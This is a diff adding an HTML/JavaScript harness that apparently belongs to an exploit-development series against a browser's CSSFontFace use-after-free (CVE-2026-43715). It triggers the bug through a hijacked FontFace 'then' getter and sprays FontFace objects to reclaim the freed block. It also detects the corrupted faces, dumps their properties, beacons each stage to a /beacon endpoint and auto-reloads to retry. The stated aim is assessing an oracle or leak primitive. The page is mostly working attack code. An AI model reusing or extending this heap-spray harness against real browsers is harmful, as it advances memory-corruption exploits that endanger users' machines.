@@ -1,0 +1,276 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<title>V976 - FontFace UAF HIT characterization (CSSFontFace tail-survival, V975 follow-up)</title>
+<style>
+  body { background:#0b0e14; color:#d7e0ea; font-family:ui-monospace,Menlo,monospace; padding:14px; }
+  h1 { color:#58a6ff; font-size:15px; margin:0 0 6px; }
+  p  { color:#8b949e; font-size:12px; margin:4px 0 10px; line-height:1.55; }
+  pre { font-size:12px; white-space:pre-wrap; }
+  .key { border-left:3px solid #d29922; padding-left:8px; }
+</style>
+</head>
+<body>
+<h1>V976 - CSSFontFace UAF (CVE-2026-43715) HIT characterization on 14.20</h1>
+
+<p class="key">
+<b>Follow-up to V975 face-mode (2026-11-10):</b> V975 face (arm=1, via=js) produced
+<b>STATUS-HIT &times;4 / 5 tries, 4 survivals</b> — a sprayed never-pumped CSSFontFace reclaimed the freed 192B block,
+received the stray <code>m_status=Success(3)</code> writeback from the <code>setStatus</code> tail, and became
+JS-observable as <code>face.status==='loaded'</code> while the process survived (tail ran on a live face, valid
+<code>m_thread</code> ⇒ Timer assert passed). V976 characterizes that primitive:
+(1) <b>repeatability &amp; which K-slot is hit</b> (index + count per try); (2) <b>observable corruption</b> on every
+hit face vs a known-good baseline face — all JS-exposed FontFace properties
+(family/style/weight/stretch/unicodeRange/variant/featureSettings/display/status) plus <code>face.loaded</code>
+promise settled-state probing (safe, deferred); (3) <b>via=style</b> vs <b>via=js</b> comparison
+(<code>&amp;via=js|style</code>).
+<br><b>Acceptance:</b> HIT with dump = characterization data (repeatable index? consistent property view? any anomaly
+beyond status?) = basis for oracle/leak assessment; NOHIT = reclaim missed this try; CRASH = tail/reclaim race (stop
+after 2). No address math, no raw memory reads. <code>&amp;k=N</code> (64), <code>&amp;via=js|style</code> (js),
+<code>&amp;arm=0</code> control, <code>&amp;stop=1</code>.
+</p>
+
+<pre id="out">starting...</pre>
+
+<script>
+'use strict';
+
+var SEEK = location.pathname;
+var RUN = 'r' + Date.now().toString(36) + '-' + Math.random().toString(36).slice(2, 7);
+var Q = function (k, d) { var m = location.search.match(new RegExp('[?&]' + k + '=(\\d+)')); return m ? parseInt(m[1], 10) : d; };
+var VIA = (location.search.match(/via=(js|style)/) || [])[1] || 'js';
+var K = Math.min(Math.max(Q('k', 64), 8), 256);
+var ARM = location.search.indexOf('arm=0') < 0;
+var STOP = location.search.indexOf('stop=1') >= 0;
+var MAXLOADS = 8;
+var KSUF = Date.now().toString(36).slice(-5) + Math.random().toString(36).slice(2, 5);
+var FAMILY = 'v976v' + KSUF;
+var KFAMPREFIX = 'v976k' + KSUF;
+var SCANNED = false;
+
+function lsGet(k) { try { return window.localStorage.getItem('v976_' + k); } catch (e) { return null; } }
+function lsSet(k, v) { try { window.localStorage.setItem('v976_' + k, String(v)); } catch (e) {} }
+function lsDel(k) { try { window.localStorage.removeItem('v976_' + k); } catch (e) {} }
+
+function bks(tag, body) {
+  var u = '/beacon/V976-' + tag + '?d=' +
+          encodeURIComponent(String(body == null ? '' : body).slice(0, 460)) +
+          '&run=' + encodeURIComponent(RUN) + '&t=' + Date.now() + '&s=1';
+  try { var x = new XMLHttpRequest(); x.open('GET', u, false); x.send(null); }
+  catch (e) { try { var i = new Image(); i.src = u; } catch (e2) {} }
+}
+
+var O = document.getElementById('out');
+function say(s) { O.textContent += '\n' + s; }
+function errOf(e) { return e ? String(e.name || 'Error') + ':' + String(e.message || '').slice(0, 80) : 'none'; }
+function reloadSoon(ms) {
+  if (STOP) { bks('STOPPED', 'no reload (stop=1)'); return; }
+  setTimeout(function () {
+    location.href = SEEK + '?op=auto&via=' + VIA + '&k=' + K + (ARM ? '' : '&arm=0') + '&r=' + Date.now();
+  }, ms);
+}
+
+var KEEP = null, KSTYLE = null, KFACES = null, TRIG_FIRED = 0, RULE = null, FACE = null;
+
+function findCssFace(family) {
+  try {
+    var it = document.fonts.values(), e;
+    while (!(e = it.next()).done) {
+      if (String(e.value.family).replace(/['"]/g, '') === family) return e.value;
+    }
+  } catch (e2) {}
+  return null;
+}
+
+function installGetter() {
+  try {
+    Object.defineProperty(FontFace.prototype, 'then', {
+      get: function () {
+        TRIG_FIRED++;
+        if (TRIG_FIRED === 1) {
+          bks('TRIG', 'via=' + VIA + ',status=' + (FACE ? FACE.status : '?') + ',arm=' + (ARM ? 1 : 0));
+          if (ARM) {
+            try {
+              RULE.style.setProperty('font-weight', 'bold');
+              if (VIA === 'js') {
+                document.body.offsetHeight;
+                var faces = new Array(K), made = 0;
+                for (var i = 0; i < K; i++) {
+                  try {
+                    var f = new FontFace(KFAMPREFIX + i, 'local("Nope' + KSUF + i + '")');
+                    document.fonts.add(f);
+                    faces[i] = f;
+                    made++;
+                  } catch (e2) { bks('SPRAYERR', 'i=' + i + ',' + errOf(e2)); break; }
+                }
+                KFACES = faces;
+                bks('FACEWAVE', 'k=' + K + ',made=' + made + ',via=js');
+              } else {
+                var rules = [];
+                for (var j = 0; j < K; j++)
+                  rules.push("@font-face { font-family: '" + KFAMPREFIX + j + "'; src: local('Nope" + KSUF + j + "'); }");
+                KSTYLE = document.createElement('style');
+                KSTYLE.textContent = rules.join('');
+                document.head.appendChild(KSTYLE);
+                document.body.offsetHeight;
+                bks('FACEWAVE', 'k=' + K + ',via=style,layout done');
+              }
+            } catch (e) { bks('TRIGERR', errOf(e)); }
+          }
+        }
+        return undefined;
+      },
+      configurable: true
+    });
+  } catch (e) { bks('ERR', 'defineProperty:' + errOf(e)); }
+}
+
+function safeProp(obj, name) {
+  try { var v = obj[name]; return (v == null) ? String(v) : String(v).slice(0, 60); }
+  catch (e) { return 'ERR:' + errOf(e); }
+}
+
+function dumpFace(face, label, idx) {
+  var props = ['family','style','weight','stretch','unicodeRange','variant','featureSettings','display','status'];
+  var parts = [];
+  for (var i = 0; i < props.length; i++) parts.push(props[i] + '=' + safeProp(face, props[i]));
+  parts.push('idx=' + idx);
+  bks(label, parts.join('|').slice(0, 440));
+  // probe loaded promise state asynchronously (safe, no blocking)
+  try {
+    var p = face.loaded;
+    var settled = 'pending';
+    p.then(function () { bks(label + '-P', 'idx=' + idx + ',loaded=fulfilled'); },
+           function (e) { bks(label + '-P', 'idx=' + idx + ',loaded=rejected:' + errOf(e)); });
+    // also check synchronously-observable hints
+    bks(label + '-LT', 'idx=' + idx + ',loadedType=' + (p && p.constructor ? p.constructor.name : typeof p) + ',status=' + safeProp(face,'status'));
+  } catch (e) { bks(label + '-PE', 'idx=' + idx + ',' + errOf(e)); }
+}
+
+function scanFaces() {
+  var hits = [], total = 0, other = [], hitFaces = [];
+  try {
+    var it = document.fonts.values(), e;
+    while (!(e = it.next()).done) {
+      var f = e.value;
+      var fam = String(f.family).replace(/['"]/g, '');
+      if (fam.indexOf(KFAMPREFIX) !== 0) continue;
+      total++;
+      var s = String(f.status);
+      // try to recover numeric index from family suffix
+      var idxStr = fam.slice(KFAMPREFIX.length);
+      if (s === 'loaded' || s === 'error') { hits.push(idxStr + ':' + s); hitFaces.push({ f: f, idx: idxStr, s: s }); }
+      else if (s !== 'unloaded') other.push(idxStr + ':' + s);
+    }
+  } catch (e2) { bks('FSCANERR', errOf(e2)); }
+  bks('FACESCAN', 'k=' + K + ',via=' + VIA + ',total=' + total + ',hits=' + hits.length + ',other=' + other.length +
+      ',victimFace=' + (FACE ? FACE.status : '?') + ',fonts=' + (function () { try { return document.fonts.size; } catch (e3) { return '?'; } })());
+  if (hits.length) bks('HIT', 'STATUS-WRITEBACK:' + hits.join('|').slice(0, 380));
+  else bks('NOHIT', 'all K faces unloaded - reclaim missed or writeback not visible');
+  if (other.length) bks('FOTHER', other.join('|').slice(0, 300));
+
+  // dump each hit face and one baseline (first K face) for comparison
+  if (hitFaces.length) {
+    for (var h = 0; h < hitFaces.length && h < 3; h++) dumpFace(hitFaces[h].f, 'HITFACE', hitFaces[h].idx);
+  }
+  // baseline: first sprayed face that is still unloaded
+  try {
+    var it2 = document.fonts.values(), e2;
+    while (!(e2 = it2.next()).done) {
+      var bf = e2.value;
+      var bfam = String(bf.family).replace(/['"]/g, '');
+      if (bfam.indexOf(KFAMPREFIX) !== 0) continue;
+      if (String(bf.status) === 'unloaded') { dumpFace(bf, 'BASE', bfam.slice(KFAMPREFIX.length)); break; }
+    }
+  } catch (e4) {}
+}
+
+function triesOf() { var t = parseInt(lsGet('tries') || '0', 10); return isNaN(t) ? 0 : t; }
+function bumpTry() { var t = triesOf() + 1; lsSet('tries', t); return t; }
+
+function main() {
+  if (location.search.indexOf('reset=1') >= 0) {
+    lsDel('pending'); lsDel('loads'); lsDel('tries'); lsDel('phase');
+    bks('RESET', 'cleared,via=' + VIA);
+    say('cleared. reopening in 1.5s...');
+    setTimeout(function () {
+      location.href = SEEK + '?op=auto&via=' + VIA + '&k=' + K + (ARM ? '' : '&arm=0') + '&r=' + Date.now();
+    }, 1500);
+    return;
+  }
+
+  var loads = parseInt(lsGet('loads') || '0', 10) + 1;
+  lsSet('loads', loads);
+  if (loads > MAXLOADS) {
+    lsSet('phase', 'done');
+    bks('GIVEUP', 'loads=' + loads + ',via=' + VIA + ',k=' + K);
+    say('give up (phase=done) - reset with ?reset=1');
+    return;
+  }
+
+  var pend = lsGet('pending');
+  if (pend) {
+    lsDel('pending');
+    bks('CRASH', 'pending=' + pend + ',try=' + triesOf() + ',load=' + loads + ',via=' + VIA);
+    say('CRASH pending=' + pend);
+    reloadSoon(4000); return;
+  }
+  if (lsGet('phase') === 'done') { say('done. reset with ?reset=1'); bks('ALREADY', 'done'); return; }
+
+  var tryN = bumpTry();
+  bks('ENV', 'via=' + VIA + ',k=' + K + ',arm=' + (ARM ? 1 : 0) + ',try=' + tryN + ',load=' + loads +
+      ',devMs=' + Date.now() + ',ua=' + navigator.userAgent.slice(0, 90));
+  bks('BOOT', 'load=' + loads + ',try=' + tryN + ',family=' + FAMILY);
+
+  var st = document.createElement('style');
+  st.id = 'v976style';
+  st.textContent = "@font-face { font-family: '" + FAMILY + "'; src: local('Arial'); }";
+  document.head.appendChild(st);
+  document.body.offsetHeight;
+  RULE = st.sheet.cssRules[0];
+  FACE = findCssFace(FAMILY);
+  if (!FACE) { bks('ERR', 'NO-FACE'); reloadSoon(4000); return; }
+  bks('SETUP', 'family=' + FAMILY + ',src=local(Arial),status=' + FACE.status);
+
+  installGetter();
+
+  lsSet('pending', 'v976:via=' + VIA + ':try=' + tryN + ':devMs=' + Date.now());
+  bks('LOADPRE', 'eager-loaded-access then face.load');
+
+  var p;
+  try {
+    var eager = FACE.loaded;
+    bks('EAGER', 'face.loaded accessed,type=' + (eager && eager.constructor ? eager.constructor.name : typeof eager));
+    p = FACE.load();
+  } catch (e) {
+    lsDel('pending'); bks('LOADERR', errOf(e)); reloadSoon(4000); return;
+  }
+
+  function after() {
+    if (SCANNED) return;
+    SCANNED = true;
+    try {
+      scanFaces();
+      try { delete FontFace.prototype.then; } catch (e1) {}
+      bks('DONE', 'try=' + tryN + ' complete,trig=' + TRIG_FIRED + ',via=' + VIA);
+      say('done trig=' + TRIG_FIRED);
+      setTimeout(function () {
+        lsDel('pending');
+        bks('RELEASED', 'pending cleared after 5s grace');
+        reloadSoon(300);
+      }, 5000);
+    } catch (e) {
+      bks('FATAL', errOf(e)); lsDel('pending'); reloadSoon(4000);
+    }
+  }
+
+  try { p.then(after, after); } catch (e) { try { p.then(after)['catch'](after); } catch (e2) { after(); } }
+}
+
+try { main(); } catch (e) { bks('FATAL', String(e && (e.message || e)).slice(0, 200)); say('FATAL ' + e); }
+</script>
+</body>
+</html>
